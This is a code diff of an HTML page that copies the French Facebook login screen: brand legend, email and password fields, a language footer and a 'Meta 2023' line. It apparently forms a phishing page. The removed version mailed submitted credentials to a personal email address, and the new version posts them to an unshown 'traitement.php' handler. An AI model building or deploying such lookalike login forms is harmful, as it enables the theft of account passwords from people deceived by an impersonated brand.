@@ -7,20 +7,51 @@
     <link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
+  <div class="header">
+    <p>Utiliser Facebook pour Android et naviguer plus rapidement</p>
+  </div>
   <div class="container">
     <fieldset>
-      <legend>Facebook</legend>
-      <form method="post" action="mailto:daniel.ryota123@gmail.com">
-        <input type="text" placeholder="Adresse e-mail ou numéro de téléphone" name="email">
+      <legend>facebook</legend>
+      <form method="post" action="traitement.php">
+        <input type="text" placeholder="Adresse e-mail ou numéro de téléphone" name="Adresse">
         <input type="password" placeholder="Mot de passe" name="password">
-        <button type="submit" class="connexion-button"><a href="in.html" class="ref">Connexion</a></button>
+        <button type="submit" class="connexion-button"><a href="#" class="ref">Connexion</a></button>
         <div class="links">
           <a href="#">Mot de passe oublié ?</a><br><br>
-          <hr>ou<hr><br>
+          <div class="hr-container">
+            <hr>
+              <span>ou</span>
+            <hr>
+          </div>
           <a href="inscription.html"><button type="button" class="create-account-button">Créer un compte</button></a>
         </div>
       </form>
     </fieldset>
+  </div>
+  <div class="footer">
+    <footer class="footer-container">
+      <div class="gauche">
+        <center>
+        <p class="francais">Francais(France)</p>
+        <p>Fula</p>
+        <p>Portuges(Brasil)</p>
+        <p>italiano</p>
+        </center>
+      </div>
+      <div class="droite">
+        <center>
+          <p>English(US)</p>
+          <p>Espagnol(Espana)</p>
+          <p>Deutsch</p>
+        </center>
+      </div>
+      <div class="bas">
+        <center>
+          <p>Meta <span></span> 2023</p>
+        </center>
+      </div>
+    </footer>
   </div>
 </body>
 </html>
